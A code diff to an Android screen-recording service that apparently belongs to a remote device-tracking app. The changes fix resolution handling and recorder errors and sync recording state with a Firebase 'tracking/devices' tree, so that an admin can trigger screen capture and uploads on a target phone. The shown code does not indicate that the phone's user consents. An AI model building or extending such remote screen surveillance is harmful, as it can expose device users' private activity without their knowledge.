@@ -104,14 +104,58 @@ class ScreenRecordService : Service() {
                 mediaProjection = mpManager.getMediaProjection(resultCode, data)
             }
 
+            if (mediaProjection == null) {
+                Log.e(TAG, "MediaProjection is null, falling back to screenshot")
+                ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
+                stopSelf()
+                return
+            }
+
+            // Android 14 (API 34+) requires registering a callback before createVirtualDisplay
+            try {
+                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
+                    override fun onStop() {
+                        Log.d(TAG, "MediaProjection stopped by system")
+                        mediaProjection = null
+                        isCurrentlyRecording = false
+                    }
+                }, handler)
+            } catch (e: Exception) {
+                Log.w(TAG, "registerCallback exception: ${e.message}")
+            }
+
             val wm = getSystemService(WINDOW_SERVICE) as WindowManager
             val metrics = DisplayMetrics()
-            @Suppress("DEPRECATION")
-            wm.defaultDisplay.getMetrics(metrics)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                val windowMetrics = wm.currentWindowMetrics
+                val bounds = windowMetrics.bounds
+                metrics.widthPixels = bounds.width()
+                metrics.heightPixels = bounds.height()
+                metrics.densityDpi = resources.configuration.densityDpi
+            } else {
+                @Suppress("DEPRECATION")
+                wm.defaultDisplay.getRealMetrics(metrics)
+            }
 
-            val width = 480
-            val height = 800
+            var width = metrics.widthPixels
+            var height = metrics.heightPixels
             val density = metrics.densityDpi
+
+            // Scale to max 720p with correct aspect ratio
+            val maxDim = 720
+            if (width > maxDim || height > maxDim) {
+                if (width < height) {
+                    height = (height.toFloat() * maxDim / width).toInt()
+                    width = maxDim
+                } else {
+                    width = (width.toFloat() * maxDim / height).toInt()
+                    height = maxDim
+                }
+            }
+            width = (width / 16) * 16
+            height = (height / 16) * 16
+            if (width <= 0) width = 480
+            if (height <= 0) height = 800
 
             outputFile = File(cacheDir, "screen_rec_${System.currentTimeMillis()}.mp4")
 
@@ -125,9 +169,13 @@ class ScreenRecordService : Service() {
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                 setVideoSize(width, height)
-                setVideoFrameRate(15)
-                setVideoEncodingBitRate(800 * 1000) // 800 kbps
+                setVideoFrameRate(24)
+                setVideoEncodingBitRate(1200 * 1000) // 1.2 Mbps
                 setOutputFile(outputFile?.absolutePath)
+                setOnErrorListener { _, what, extra ->
+                    Log.e(TAG, "MediaRecorder error: what=$what extra=$extra")
+                    stopAndUploadRecording()
+                }
                 prepare()
             }
 
@@ -139,28 +187,32 @@ class ScreenRecordService : Service() {
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 mediaRecorder?.surface,
                 null,
-                null
+                handler
             )
 
             mediaRecorder?.start()
             recordingStartTime = System.currentTimeMillis()
             isCurrentlyRecording = true
-            Log.d(TAG, "Screen recording started continuously...")
+            Log.d(TAG, "Screen recording started continuously: ${width}x${height}...")
 
             val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
             val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
             mediaRef.child("is_screen_recording").setValue(true)
             mediaRef.child("status").setValue("📹 Ekran yozilmoqda...")
 
-            // 5 daqiqalik xavfsizlik chegarasi (agar admin to'xtatishni unutsa)
+            // 10 daqiqalik xavfsizlik chegarasi (agar admin to'xtatishni unutsa)
             handler.postDelayed({
                 if (isCurrentlyRecording) {
                     stopAndUploadRecording()
                 }
-            }, 300000L)
+            }, 600000L)
 
         } catch (e: Exception) {
             Log.e(TAG, "Failed to start screen recording: ${e.message}", e)
+            val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+            database.getReference("tracking/devices/$targetDeviceId/media/is_screen_recording").setValue(false)
+            database.getReference("tracking/devices/$targetDeviceId/commands/record_screen").setValue(false)
+            database.getReference("tracking/devices/$targetDeviceId/media/status").setValue("Ekran yozish xatosi: ${e.message}")
             ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
             stopSelf()
         }
@@ -196,6 +248,7 @@ class ScreenRecordService : Service() {
         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
         val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
         mediaRef.child("is_screen_recording").setValue(false)
+        database.getReference("tracking/devices/$targetDeviceId/commands/record_screen").setValue(false)
 
         if (file != null && file.exists() && file.length() > 0) {
             Thread {
@@ -224,6 +277,7 @@ class ScreenRecordService : Service() {
             }.start()
         } else {
             // Video bo'sh bo'lsa, skrinshot olamiz
+            database.getReference("tracking/devices/$targetDeviceId/commands/record_screen").setValue(false)
             ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
             stopSelf()
         }
